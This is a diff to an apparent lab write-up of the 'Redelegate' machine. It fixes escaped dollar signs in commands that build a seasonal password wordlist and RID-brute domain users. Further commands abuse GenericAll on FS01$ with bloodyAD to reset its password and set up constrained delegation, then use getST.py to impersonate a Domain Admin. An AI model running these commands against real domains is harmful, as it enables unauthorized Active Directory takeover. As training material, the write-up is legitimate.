@@ -181,7 +181,7 @@ seasons = ['Spring', 'Summer', 'Autumn', 'Fall', 'Winter',
            'January', 'February', 'March', 'April', 'May', 'June',
            'July', 'August', 'September', 'October', 'November', 'December']
 
-suffixes = ['!', '@', '#', '\$', '%', '&', '*', '.', '!!', '@!', '#!', '1!', '123',
+suffixes = ['!', '@', '#', '$', '%', '&', '*', '.', '!!', '@!', '#!', '1!', '123',
             '1', '12', '01', '?', '!?', '']
 
 with open('season_wordlist.txt', 'w') as f:
@@ -227,7 +227,7 @@ netexec mssql 10.129.45.145 -u SQLGuest -p zDPBpaF4FywlqIv11vii --rid-brute
 
 Extracting just the usernames from the output:
 \`\`\`bash
-cat msusers.txt | awk -F '\\\\' '{print \$2}'
+cat msusers.txt | awk -F '\\\\' '{print $2}'
 \`\`\`
 ![Extracted domain usernames list](/images/writeups/redelegate/9.png)
 
@@ -294,18 +294,18 @@ The key distinction here is that **GenericAll** alone lets you write any LDAP at
 ### Resetting FS01$ and Configuring Delegation
 Since we have **GenericAll** on \`FS01$\`, the first step is resetting the computer account password to take control of it:
 \`\`\`bash
-bloodyAD -d redelegate.vl --host 10.129.45.145 -u 'Helen.Frost' -p 'P@ssw0rd!' set password 'FS01\$' 'NewPass123!'
+bloodyAD -d redelegate.vl --host 10.129.45.145 -u 'Helen.Frost' -p 'P@ssw0rd!' set password 'FS01$' 'NewPass123!'
 \`\`\`
 
 With the password reset, we can now configure constrained delegation on \`FS01$\`. Setting \`msDS-AllowedToDelegateTo\` to point at the DC's CIFS service tells the KDC that \`FS01$\` is allowed to request service tickets to \`cifs/dc.redelegate.vl\` on behalf of other users (S4U2Proxy):
 \`\`\`bash
-bloodyAD -d redelegate.vl --host 10.129.45.145 -u 'Helen.Frost' -p 'P@ssw0rd!' set object 'FS01\$' msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl'
+bloodyAD -d redelegate.vl --host 10.129.45.145 -u 'Helen.Frost' -p 'P@ssw0rd!' set object 'FS01$' msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl'
 \`\`\`
 ![Constrained delegation configured on FS01$ pointing to cifs/dc.redelegate.vl](/images/writeups/redelegate/19.png)
 
 The next piece is enabling **Protocol Transition** by setting \`userAccountControl\` to \`16781312\`, which is \`WORKSTATION_TRUST_ACCOUNT (0x1000)\` + \`TRUSTED_TO_AUTH_FOR_DELEGATION (0x1000000)\`. This allows \`FS01$\` to obtain a service ticket for itself on behalf of any user (S4U2Self), even without that user authenticating first:
 \`\`\`bash
-bloodyAD -d redelegate.vl --host 10.129.45.145 -u 'Helen.Frost' -p 'P@ssw0rd!' set object 'FS01\$' userAccountControl -v 16781312
+bloodyAD -d redelegate.vl --host 10.129.45.145 -u 'Helen.Frost' -p 'P@ssw0rd!' set object 'FS01$' userAccountControl -v 16781312
 \`\`\`
 ![userAccountControl set to enable TRUSTED_TO_AUTH_FOR_DELEGATION](/images/writeups/redelegate/20.png)
 
@@ -314,7 +314,7 @@ To summarize how the S4U chain works: first, \`FS01$\` asks the KDC for a servic
 ### Impersonating a Domain Admin
 With the delegation configured, the first attempt targets the \`Administrator\` account, but it fails with \`KDC_ERR_BADOPTION\`:
 \`\`\`bash
-getST.py -spn cifs/dc.redelegate.vl -impersonate Administrator -dc-ip 10.129.45.145 'redelegate.vl/FS01\$:NewPass123!'
+getST.py -spn cifs/dc.redelegate.vl -impersonate Administrator -dc-ip 10.129.45.145 'redelegate.vl/FS01$:NewPass123!'
 \`\`\`
 ![getST.py failing with KDC_ERR_BADOPTION for Administrator](/images/writeups/redelegate/21.png)
 
@@ -325,7 +325,7 @@ This happens because \`Administrator\` has **"Account is sensitive and cannot be
 
 However, \`Ryan.Cooper\` is also a **Domain Admin** but does NOT have the sensitive flag set (\`Marked Sensitive: FALSE\`), making him a valid delegation target. Running \`getST.py\` again targeting \`Ryan.Cooper\` succeeds:
 \`\`\`bash
-getST.py -spn cifs/dc.redelegate.vl -impersonate Ryan.Cooper -dc-ip 10.129.45.145 'redelegate.vl/FS01\$:NewPass123!'
+getST.py -spn cifs/dc.redelegate.vl -impersonate Ryan.Cooper -dc-ip 10.129.45.145 'redelegate.vl/FS01$:NewPass123!'
 \`\`\`
 ![getST.py successfully impersonating Ryan.Cooper](/images/writeups/redelegate/24.png)
 
